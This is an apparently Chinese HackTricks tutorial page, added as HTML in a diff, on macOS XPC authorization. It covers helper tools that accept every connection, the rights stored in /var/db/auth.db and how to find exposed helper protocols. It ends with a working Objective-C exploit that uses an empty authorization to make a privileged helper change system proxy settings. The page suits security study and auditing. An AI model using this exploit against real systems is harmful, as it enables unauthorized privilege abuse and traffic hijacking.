@@ -1,0 +1,623 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS XPC Authorization</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-xpc-授权"><a class="header" href="#macos-xpc-授权">macOS XPC 授权</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="xpc-授权"><a class="header" href="#xpc-授权">XPC 授权</a></h2>
+<p>苹果还提出了另一种方法来验证连接进程是否具有 <strong>调用暴露的 XPC 方法的权限</strong>。</p>
+<p>当应用程序需要 <strong>以特权用户身份执行操作</strong> 时，通常不会以特权用户身份运行该应用，而是作为根用户安装一个 HelperTool 作为 XPC 服务，可以从应用程序调用以执行这些操作。然而，调用该服务的应用程序应该具有足够的授权。</p>
+<h3 id="shouldacceptnewconnection-始终返回-yes"><a class="header" href="#shouldacceptnewconnection-始终返回-yes">ShouldAcceptNewConnection 始终返回 YES</a></h3>
+<p>一个例子可以在 <a href="https://github.com/brenwell/EvenBetterAuthorizationSample">EvenBetterAuthorizationSample</a> 中找到。在 <code>App/AppDelegate.m</code> 中，它尝试 <strong>连接</strong> 到 <strong>HelperTool</strong>。而在 <code>HelperTool/HelperTool.m</code> 中，函数 <strong><code>shouldAcceptNewConnection</code></strong> <strong>不会检查</strong> 之前提到的任何要求。它将始终返回 YES：</p>
+<pre><code class="language-objectivec">- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
+// Called by our XPC listener when a new connection comes in.  We configure the connection
+// with our protocol and ourselves as the main object.
+{
+assert(listener == self.listener);
+#pragma unused(listener)
+assert(newConnection != nil);
+
+newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
+newConnection.exportedObject = self;
+[newConnection resume];
+
+return YES;
+}
+</code></pre>
+<p>有关如何正确配置此检查的更多信息，请参见：</p>
+<p>{% content-ref url="macos-xpc-connecting-process-check/" %}
+<a href="macos-xpc-connecting-process-check/">macos-xpc-connecting-process-check</a>
+{% endcontent-ref %}</p>
+<h3 id="应用程序权限"><a class="header" href="#应用程序权限">应用程序权限</a></h3>
+<p>然而，当调用 HelperTool 的方法时，确实存在一些 <strong>授权</strong>。</p>
+<p><code>App/AppDelegate.m</code> 中的 <strong><code>applicationDidFinishLaunching</code></strong> 函数将在应用程序启动后创建一个空的授权引用。这应该始终有效。<br />
+然后，它将尝试通过调用 <code>setupAuthorizationRights</code> 来 <strong>添加一些权限</strong> 到该授权引用：</p>
+<pre><code class="language-objectivec">- (void)applicationDidFinishLaunching:(NSNotification *)note
+{
+[...]
+err = AuthorizationCreate(NULL, NULL, 0, &amp;self-&gt;_authRef);
+if (err == errAuthorizationSuccess) {
+err = AuthorizationMakeExternalForm(self-&gt;_authRef, &amp;extForm);
+}
+if (err == errAuthorizationSuccess) {
+self.authorization = [[NSData alloc] initWithBytes:&amp;extForm length:sizeof(extForm)];
+}
+assert(err == errAuthorizationSuccess);
+
+// If we successfully connected to Authorization Services, add definitions for our default
+// rights (unless they're already in the database).
+
+if (self-&gt;_authRef) {
+[Common setupAuthorizationRights:self-&gt;_authRef];
+}
+
+[self.window makeKeyAndOrderFront:self];
+}
+</code></pre>
+<p>函数 <code>setupAuthorizationRights</code> 来自 <code>Common/Common.m</code>，将应用程序的权限存储在授权数据库 <code>/var/db/auth.db</code> 中。请注意，它只会添加尚未在数据库中的权限：</p>
+<pre><code class="language-objectivec">+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
+// See comment in header.
+{
+assert(authRef != NULL);
+[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
+OSStatus    blockErr;
+
+// First get the right.  If we get back errAuthorizationDenied that means there's
+// no current definition, so we add our default one.
+
+blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
+if (blockErr == errAuthorizationDenied) {
+blockErr = AuthorizationRightSet(
+authRef,                                    // authRef
+[authRightName UTF8String],                 // rightName
+(__bridge CFTypeRef) authRightDefault,      // rightDefinition
+(__bridge CFStringRef) authRightDesc,       // descriptionKey
+NULL,                                       // bundle (NULL implies main bundle)
+CFSTR("Common")                             // localeTableName
+);
+assert(blockErr == errAuthorizationSuccess);
+} else {
+// A right already exists (err == noErr) or any other error occurs, we
+// assume that it has been set up in advance by the system administrator or
+// this is the second time we've run.  Either way, there's nothing more for
+// us to do.
+}
+}];
+}
+</code></pre>
+<p>函数 <code>enumerateRightsUsingBlock</code> 用于获取应用程序权限，这些权限在 <code>commandInfo</code> 中定义：</p>
+<pre><code class="language-objectivec">static NSString * kCommandKeyAuthRightName    = @"authRightName";
+static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
+static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";
+
++ (NSDictionary *)commandInfo
+{
+static dispatch_once_t sOnceToken;
+static NSDictionary *  sCommandInfo;
+
+dispatch_once(&amp;sOnceToken, ^{
+sCommandInfo = @{
+NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
+kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
+kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
+kCommandKeyAuthRightDesc    : NSLocalizedString(
+@"EBAS is trying to read its license key.",
+@"prompt shown when user is required to authorize to read the license key"
+)
+},
+NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
+kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
+kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
+kCommandKeyAuthRightDesc    : NSLocalizedString(
+@"EBAS is trying to write its license key.",
+@"prompt shown when user is required to authorize to write the license key"
+)
+},
+NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
+kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
+kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
+kCommandKeyAuthRightDesc    : NSLocalizedString(
+@"EBAS is trying to start its web service.",
+@"prompt shown when user is required to authorize to start the web service"
+)
+}
+};
+});
+return sCommandInfo;
+}
+
++ (NSString *)authorizationRightForCommand:(SEL)command
+// See comment in header.
+{
+return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
+}
+
++ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
+// Calls the supplied block with information about each known authorization right..
+{
+[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
+#pragma unused(key)
+#pragma unused(stop)
+NSDictionary *  commandDict;
+NSString *      authRightName;
+id              authRightDefault;
+NSString *      authRightDesc;
+
+// If any of the following asserts fire it's likely that you've got a bug
+// in sCommandInfo.
+
+commandDict = (NSDictionary *) obj;
+assert([commandDict isKindOfClass:[NSDictionary class]]);
+
+authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
+assert([authRightName isKindOfClass:[NSString class]]);
+
+authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
+assert(authRightDefault != nil);
+
+authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
+assert([authRightDesc isKindOfClass:[NSString class]]);
+
+block(authRightName, authRightDefault, authRightDesc);
+}];
+}
+</code></pre>
+<p>这意味着在这个过程结束时，<code>commandInfo</code> 中声明的权限将存储在 <code>/var/db/auth.db</code> 中。请注意，您可以找到 <strong>每个方法</strong> 需要 <strong>身份验证</strong> 的 <strong>权限名称</strong> 和 <strong><code>kCommandKeyAuthRightDefault</code></strong>。后者 <strong>指示谁可以获得这个权限</strong>。</p>
+<p>有不同的范围来指示谁可以访问某个权限。其中一些在 <a href="https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h">AuthorizationDB.h</a> 中定义（您可以在这里找到 <a href="https://www.dssw.co.uk/reference/authorization-rights/">所有的权限</a>），但总结如下：</p>
+<table><thead><tr><th width="284.3333333333333">名称</th><th width="165">值</th><th>描述</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>任何人</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>没有人</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>当前用户需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>要求用户进行身份验证。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>要求用户进行身份验证。他需要是管理员（在管理员组内）</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>指定规则</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>指定一些关于权限的额外评论</td></tr></tbody></table>
+<h3 id="权限验证"><a class="header" href="#权限验证">权限验证</a></h3>
+<p>在 <code>HelperTool/HelperTool.m</code> 中，函数 <strong><code>readLicenseKeyAuthorization</code></strong> 检查调用者是否被授权 <strong>执行此方法</strong>，通过调用函数 <strong><code>checkAuthorization</code></strong>。该函数将检查调用进程发送的 <strong>authData</strong> 是否具有 <strong>正确格式</strong>，然后检查 <strong>获取调用特定方法的权限所需的内容</strong>。如果一切顺利，<strong>返回的 <code>error</code> 将为 <code>nil</code></strong>：</p>
+<pre><code class="language-objectivec">- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
+{
+[...]
+
+// First check that authData looks reasonable.
+
+error = nil;
+if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
+error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
+}
+
+// Create an authorization ref from that the external form data contained within.
+
+if (error == nil) {
+err = AuthorizationCreateFromExternalForm([authData bytes], &amp;authRef);
+
+// Authorize the right associated with the command.
+
+if (err == errAuthorizationSuccess) {
+AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
+AuthorizationRights rights   = { 1, &amp;oneRight };
+
+oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
+assert(oneRight.name != NULL);
+
+err = AuthorizationCopyRights(
+authRef,
+&amp;rights,
+NULL,
+kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
+NULL
+);
+}
+if (err != errAuthorizationSuccess) {
+error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
+}
+}
+
+if (authRef != NULL) {
+junk = AuthorizationFree(authRef, 0);
+assert(junk == errAuthorizationSuccess);
+}
+
+return error;
+}
+</code></pre>
+<p>注意，要<strong>检查获取调用该方法的权限</strong>，函数 <code>authorizationRightForCommand</code> 只会检查之前的注释对象 <strong><code>commandInfo</code></strong>。然后，它将调用 <strong><code>AuthorizationCopyRights</code></strong> 来检查 <strong>是否具有调用该函数的权限</strong>（注意，标志允许与用户交互）。</p>
+<p>在这种情况下，要调用函数 <code>readLicenseKeyAuthorization</code>，<code>kCommandKeyAuthRightDefault</code> 被定义为 <code>@kAuthorizationRuleClassAllow</code>。因此，<strong>任何人都可以调用它</strong>。</p>
+<h3 id="db-信息"><a class="header" href="#db-信息">DB 信息</a></h3>
+<p>提到这些信息存储在 <code>/var/db/auth.db</code>。您可以使用以下命令列出所有存储的规则：</p>
+<pre><code class="language-sql">sudo sqlite3 /var/db/auth.db
+SELECT name FROM rules;
+SELECT name FROM rules WHERE name LIKE '%safari%';
+</code></pre>
+<p>然后，您可以通过以下方式查看谁可以访问该权限：</p>
+<pre><code class="language-bash">security authorizationdb read com.apple.safaridriver.allow
+</code></pre>
+<h3 id="宽松权限"><a class="header" href="#宽松权限">宽松权限</a></h3>
+<p>您可以在<a href="https://www.dssw.co.uk/reference/authorization-rights/"><strong>这里</strong></a>找到<strong>所有权限配置</strong>，但不需要用户交互的组合如下：</p>
+<ol>
+<li><strong>'authenticate-user': 'false'</strong></li>
+</ol>
+<ul>
+<li>这是最直接的键。如果设置为<code>false</code>，则表示用户无需提供身份验证即可获得此权限。</li>
+<li>这与下面的两个中的一个或指示用户必须属于的组结合使用。</li>
+</ul>
+<ol start="2">
+<li><strong>'allow-root': 'true'</strong></li>
+</ol>
+<ul>
+<li>如果用户以root用户身份操作（具有提升的权限），并且此键设置为<code>true</code>，则root用户可能在没有进一步身份验证的情况下获得此权限。然而，通常情况下，获得root用户状态已经需要身份验证，因此对于大多数用户来说，这并不是一个“无身份验证”的场景。</li>
+</ul>
+<ol start="3">
+<li><strong>'session-owner': 'true'</strong></li>
+</ol>
+<ul>
+<li>如果设置为<code>true</code>，会话的所有者（当前登录的用户）将自动获得此权限。如果用户已经登录，这可能会绕过额外的身份验证。</li>
+</ul>
+<ol start="4">
+<li><strong>'shared': 'true'</strong></li>
+</ol>
+<ul>
+<li>此键不会在没有身份验证的情况下授予权限。相反，如果设置为<code>true</code>，则意味着一旦权限经过身份验证，它可以在多个进程之间共享，而无需每个进程重新进行身份验证。但初始授予权限仍然需要身份验证，除非与其他键结合使用，如<code>'authenticate-user': 'false'</code>。</li>
+</ul>
+<p>您可以<a href="https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9"><strong>使用此脚本</strong></a>来获取有趣的权限：</p>
+<pre><code class="language-bash">Rights with 'authenticate-user': 'false':
+is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)
+
+Rights with 'allow-root': 'true':
+com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard
+
+Rights with 'session-owner': 'true':
+authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
+</code></pre>
+<h2 id="反向授权"><a class="header" href="#反向授权">反向授权</a></h2>
+<h3 id="检查是否使用了-evenbetterauthorization"><a class="header" href="#检查是否使用了-evenbetterauthorization">检查是否使用了 EvenBetterAuthorization</a></h3>
+<p>如果你发现函数：<strong><code>[HelperTool checkAuthorization:command:]</code></strong>，那么这个进程可能正在使用前面提到的授权方案：</p>
+<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<p>如果这个函数调用了诸如 <code>AuthorizationCreateFromExternalForm</code>、<code>authorizationRightForCommand</code>、<code>AuthorizationCopyRights</code>、<code>AuhtorizationFree</code> 的函数，那么它正在使用 <a href="https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154"><strong>EvenBetterAuthorizationSample</strong></a>。</p>
+<p>检查 <strong><code>/var/db/auth.db</code></strong> 以查看是否可以在没有用户交互的情况下获取调用某些特权操作的权限。</p>
+<h3 id="协议通信"><a class="header" href="#协议通信">协议通信</a></h3>
+<p>然后，你需要找到协议方案，以便能够与 XPC 服务建立通信。</p>
+<p>函数 <strong><code>shouldAcceptNewConnection</code></strong> 表示正在导出的协议：</p>
+<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<p>在这种情况下，我们与 EvenBetterAuthorizationSample 中的相同，<a href="https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94"><strong>查看这一行</strong></a>。</p>
+<p>知道所使用的协议名称后，可以使用以下命令 <strong>转储其头部定义</strong>：</p>
+<pre><code class="language-bash">class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
+
+[...]
+@protocol HelperToolProtocol
+- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
+- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
+- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
+- (void)getVersionWithReply:(void (^)(NSString *))arg1;
+- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
+@end
+[...]
+</code></pre>
+<p>最后，我们只需要知道<strong>暴露的 Mach 服务的名称</strong>以便与之建立通信。有几种方法可以找到它：</p>
+<ul>
+<li>在**<code>[HelperTool init]</code>**中，您可以看到正在使用的 Mach 服务：</li>
+</ul>
+<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<ul>
+<li>在 launchd plist：</li>
+</ul>
+<pre><code class="language-xml">cat /Library/LaunchDaemons/com.example.HelperTool.plist
+
+[...]
+
+&lt;key&gt;MachServices&lt;/key&gt;
+&lt;dict&gt;
+&lt;key&gt;com.example.HelperTool&lt;/key&gt;
+&lt;true/&gt;
+&lt;/dict&gt;
+[...]
+</code></pre>
+<h3 id="exploit-example"><a class="header" href="#exploit-example">Exploit Example</a></h3>
+<p>在这个例子中创建了：</p>
+<ul>
+<li>协议的定义和函数</li>
+<li>一个空的授权，用于请求访问</li>
+<li>与 XPC 服务的连接</li>
+<li>如果连接成功，则调用该函数</li>
+</ul>
+<pre><code class="language-objectivec">// gcc -framework Foundation -framework Security expl.m -o expl
+
+#import &lt;Foundation/Foundation.h&gt;
+#import &lt;Security/Security.h&gt;
+
+// Define a unique service name for the XPC helper
+static NSString* XPCServiceName = @"com.example.XPCHelper";
+
+// Define the protocol for the helper tool
+@protocol XPCHelperProtocol
+- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
+- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
+- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
+- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
+- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
+@end
+
+int main(void) {
+NSData *authData;
+OSStatus status;
+AuthorizationExternalForm authForm;
+AuthorizationRef authReference = {0};
+NSString *proxyAddress = @"127.0.0.1";
+NSString *proxyPort = @"4444";
+Boolean isProxyEnabled = true;
+
+// Create an empty authorization reference
+status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &amp;authReference);
+const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+
+// Convert the authorization reference to an external form
+if (status == errAuthorizationSuccess) {
+status = AuthorizationMakeExternalForm(authReference, &amp;authForm);
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Convert the external form to NSData for transmission
+if (status == errAuthorizationSuccess) {
+authData = [[NSData alloc] initWithBytes:&amp;authForm length:sizeof(authForm)];
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Ensure the authorization was successful
+assert(status == errAuthorizationSuccess);
+
+// Establish an XPC connection
+NSString *serviceName = XPCServiceName;
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
+NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
+[xpcConnection setRemoteObjectInterface:xpcInterface];
+[xpcConnection resume];
+
+// Handle errors for the XPC connection
+id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
+NSLog(@"[-] Connection error");
+NSLog(@"[-] Error: %@", error);
+}];
+
+// Log the remote proxy and connection objects
+NSLog(@"Remote Proxy: %@", remoteProxy);
+NSLog(@"XPC Connection: %@", xpcConnection);
+
+// Use the legacy method to configure the proxy
+[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
+NSLog(@"Response: %@", error);
+}];
+
+// Allow some time for the operation to complete
+[NSThread sleepForTimeInterval:10.0f];
+
+NSLog(@"Finished!");
+}
+</code></pre>
+<h2 id="其他被滥用的-xpc-权限助手"><a class="header" href="#其他被滥用的-xpc-权限助手">其他被滥用的 XPC 权限助手</a></h2>
+<ul>
+<li><a href="https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared">https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared</a></li>
+</ul>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://theevilbit.github.io/posts/secure_coding_xpc_part1/">https://theevilbit.github.io/posts/secure_coding_xpc_part1/</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
